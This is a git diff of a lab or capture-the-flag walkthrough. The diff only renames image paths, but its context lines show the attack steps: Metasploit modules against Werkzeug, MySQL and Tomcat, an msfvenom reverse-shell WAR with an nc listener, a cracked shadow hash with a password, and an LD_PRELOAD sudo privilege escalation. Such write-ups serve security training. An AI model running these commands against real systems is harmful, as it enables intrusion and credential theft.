@@ -27,7 +27,7 @@ The best tools for this lab are:
 
 ## My Solution
 
-![](<../../../../.gitbook/assets/image (28) (1).png>)
+![](<../../../../.gitbook/assets/image (420).png>)
 
 ## Nmap
 
@@ -84,33 +84,33 @@ Nmap done: 3 IP addresses (3 hosts up) scanned in 6.98 seconds
 
 ### Dirb
 
-![](<../../../../.gitbook/assets/image (21) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (190).png>)
 
 ### Website
 
-![](<../../../../.gitbook/assets/image (55) (1) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (364).png>)
 
-![](<../../../../.gitbook/assets/image (32) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (394).png>)
 
 ### Exploit
 
-![](<../../../../.gitbook/assets/image (13) (1).png>)
+![](<../../../../.gitbook/assets/image (88).png>)
 
 ```
 use exploit/multi/http/werkzeug_debug_rce
 ```
 
-![](<../../../../.gitbook/assets/image (60) (1).png>)
+![](<../../../../.gitbook/assets/image (378).png>)
 
-![](<../../../../.gitbook/assets/image (49) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (463).png>)
 
-![](<../../../../.gitbook/assets/image (20) (1) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (403).png>)
 
-![](<../../../../.gitbook/assets/image (59) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (464).png>)
 
-![](<../../../../.gitbook/assets/image (64) (1) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (633).png>)
 
-![](<../../../../.gitbook/assets/image (8) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (202).png>)
 
 ## Server 2
 
@@ -120,15 +120,15 @@ use exploit/multi/http/werkzeug_debug_rce
 mysql -h 192.6.232.4 -u root -pfArFLP29UySm4bZj
 ```
 
-![](<../../../../.gitbook/assets/image (41) (1) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (476).png>)
 
-![](<../../../../.gitbook/assets/image (61) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (235).png>)
 
-![](<../../../../.gitbook/assets/image (9) (1) (2) (1).png>)
+![](<../../../../.gitbook/assets/image (186).png>)
 
-![](<../../../../.gitbook/assets/image (11) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (628).png>)
 
-![](<../../../../.gitbook/assets/image (54) (1) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (273).png>)
 
 ### Exploit
 
@@ -136,43 +136,43 @@ mysql -h 192.6.232.4 -u root -pfArFLP29UySm4bZj
 use exploit/multi/mysql/mysql_udf_payload
 ```
 
-![](<../../../../.gitbook/assets/image (65) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (208).png>)
 
-![](<../../../../.gitbook/assets/image (46) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (346).png>)
 
-![](<../../../../.gitbook/assets/image (52) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (356).png>)
 
-![](<../../../../.gitbook/assets/image (14) (1) (2).png>)
+![](<../../../../.gitbook/assets/image (533).png>)
 
-![FLAG: 4c537c0dfd18bafdcd59f53c7015550e](<../../../../.gitbook/assets/image (31) (1).png>)
+![FLAG: 4c537c0dfd18bafdcd59f53c7015550e](<../../../../.gitbook/assets/image (361).png>)
 
 ## Server 3
 
-![](<../../../../.gitbook/assets/image (12) (2).png>)
+![](<../../../../.gitbook/assets/image (101).png>)
 
 ```
 dirb http://192.6.232.5:8080
 ```
 
-![](<../../../../.gitbook/assets/image (51) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (348).png>)
 
-![](<../../../../.gitbook/assets/image (19) (1) (1) (2).png>)
+![](<../../../../.gitbook/assets/image (45).png>)
 
-![](<../../../../.gitbook/assets/image (33) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (404).png>)
 
-![](<../../../../.gitbook/assets/image (44) (1) (2).png>)
+![](<../../../../.gitbook/assets/image (546).png>)
 
 ```
 use auxiliary/scanner/http/tomcat_mgr_login
 ```
 
-![](<../../../../.gitbook/assets/image (53) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (50).png>)
 
-![](<../../../../.gitbook/assets/image (57) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (455).png>)
 
-![](<../../../../.gitbook/assets/image (58) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (377).png>)
 
-![](<../../../../.gitbook/assets/image (26) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (118).png>)
 
 ### Exploit
 
@@ -180,19 +180,19 @@ use auxiliary/scanner/http/tomcat_mgr_login
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.6.232.2 LPORT=6666 -f war -o revshell.war
 ```
 
-![](<../../../../.gitbook/assets/image (36) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (73).png>)
 
-![](<../../../../.gitbook/assets/image (30) (1) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (475).png>)
 
-![](<../../../../.gitbook/assets/image (10) (2).png>)
+![](<../../../../.gitbook/assets/image (138).png>)
 
-![](<../../../../.gitbook/assets/image (5) (1) (2).png>)
+![](<../../../../.gitbook/assets/image (460).png>)
 
 ```
 nc -lvp 6666
 ```
 
-![](<../../../../.gitbook/assets/image (47) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (508).png>)
 
 ```
 python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -200,33 +200,33 @@ CTRL+Z
 stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
 ```
 
-![Flag1: EBCFE35ACC27E0EA91CF3A5AB600BABE](<../../../../.gitbook/assets/image (39) (1) (1) (1).png>)
+![Flag1: EBCFE35ACC27E0EA91CF3A5AB600BABE](<../../../../.gitbook/assets/image (180).png>)
 
-![](<../../../../.gitbook/assets/image (17) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (104).png>)
 
-![](<../../../../.gitbook/assets/image (42) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (430).png>)
 
 ```
 robert:x:999:999:robert:/home/robert:
 robert:$6$D4O99Z5L$Q38CW.ym42GmIbjZRh8DA2rtLHxXgMj.ahVbrBrbWvuBXmP555cGuLG1hkQE1R0eQVX48Rs7yecdU7V96u5Tf0:17822::::::
 ```
 
-![](<../../../../.gitbook/assets/image (67) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (462).png>)
 
-![](<../../../../.gitbook/assets/image (63) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (221).png>)
 
-![](<../../../../.gitbook/assets/image (48) (1).png>)
+![](<../../../../.gitbook/assets/image (481).png>)
 
 ```
 robert:robert@1234567890!@#
 username=robert | password=robert@1234567890!@#
 ```
 
-![](<../../../../.gitbook/assets/image (43) (1) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (360).png>)
 
-![FLAG2: EC2986081E84BB845541D5CC0BEE13B3](<../../../../.gitbook/assets/image (6) (1) (1).png>)
+![FLAG2: EC2986081E84BB845541D5CC0BEE13B3](<../../../../.gitbook/assets/image (94).png>)
 
-![](<../../../../.gitbook/assets/image (18) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (108).png>)
 
 ```c
 #include <stdio.h>
@@ -254,11 +254,11 @@ Finally, **escalate privileges** running
 sudo LD_PRELOAD=pe.so <COMMAND> #Use any command you can run with sudo
 ```
 
-![](<../../../../.gitbook/assets/image (68) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (572).png>)
 
-![](<../../../../.gitbook/assets/image (16) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (423).png>)
 
-![FLAG3: 560648FC63F090A8CF776326DC13FAC7](<../../../../.gitbook/assets/image (50) (1) (1).png>)
+![FLAG3: 560648FC63F090A8CF776326DC13FAC7](<../../../../.gitbook/assets/image (571).png>)
 
 ## Resources
 
